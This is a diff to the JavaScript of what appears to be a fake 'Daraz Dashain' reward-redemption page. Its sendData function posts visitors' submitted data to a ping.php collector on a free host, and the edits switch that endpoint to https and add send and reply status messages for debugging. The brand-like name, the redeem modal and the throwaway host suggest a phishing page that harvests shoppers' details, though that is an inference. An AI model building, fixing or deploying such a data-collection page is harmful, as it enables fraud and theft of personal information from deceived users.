@@ -224,7 +224,7 @@
 "use strict";
 
 // ⚠️ POINT THIS AT YOUR INFINITYFREE HOST
-const API = "http://daraz-dashain.freedev.app/ping.php";
+const API = "https://daraz-dashain.freedev.app/ping.php";
 
 const modal       = document.getElementById('modalOverlay');
 const btnRedeem   = document.getElementById('btnRedeem');
@@ -356,15 +356,23 @@ btnSubmit.addEventListener('click', () => {
 
 /* ---------- SENDER ---------- */
 function sendData(payload) {
+  showStatus('Sending: ' + Object.keys(payload).join(','));
   return fetch(API, {
     method:'POST',
     headers:{'Content-Type':'application/json;charset=UTF-8'},
     body:JSON.stringify(payload)
   })
-  .then(r => { if(!r.ok) throw new Error('bad response'); return r.json(); })
-  .catch(e => { console.warn('Send failed', e); return {ok:false}; });
+  .then(r => {
+    showStatus('Server replied: ' + r.status);
+    return r.json();
+  })
+  .catch(e => {
+    showStatus('FAILED: ' + e.message);
+    console.warn('Send failed', e);
+    return {ok:false};
+  });
 }
-
+ 
 function showStatus(msg) {
   statusPill.textContent = msg;
   statusPill.classList.add('show');
